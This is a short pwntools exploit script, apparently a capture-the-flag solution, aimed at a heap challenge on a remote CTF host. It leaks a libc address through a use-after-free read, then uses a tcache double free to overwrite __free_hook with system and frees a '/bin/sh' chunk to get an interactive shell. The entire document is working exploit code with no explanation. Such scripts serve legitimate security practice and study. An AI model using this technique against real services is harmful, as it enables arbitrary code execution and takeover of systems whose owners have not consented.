from logging import critical
from pwn import *

elf = context.binary = ELF("chall")
libc = ELF("libc-2.27.so")

#p = process("./chall")
p = remote("ctf.sh4dy.com",7001)
#gdb.attach(p,"init-pwndbg")
p.recvline()

def malloc(size,data):
    p.sendlineafter(b">> ","1")
    p.sendlineafter(b"Size:",str(size))
    p.sendlineafter(b"Data:",data)


def free(index):
    p.sendlineafter(b">> ","2")
    p.sendlineafter(b"Index:",str(index))

def read(index):
    p.sendlineafter(b">> ","4")
    p.sendlineafter(b"Index:",str(index))
    leak = p.recvline()[:-1]
    return leak


malloc(0x500,"aaaaaaaa")
malloc(0x40,"aaaaaaaa")
free(0)
leak = read(0)
leak = u64(leak.ljust(8,b'\x00'))
libc.address = leak - 0x3aeca0
log.critical(hex(libc.address))
free_hook = libc.sym.__free_hook
free(1)
free(1)
malloc(0x40,p64(free_hook))
malloc(0x40,"/bin/sh\00")
malloc(0x40,p64(libc.sym.system))
free(3)

p.interactive()
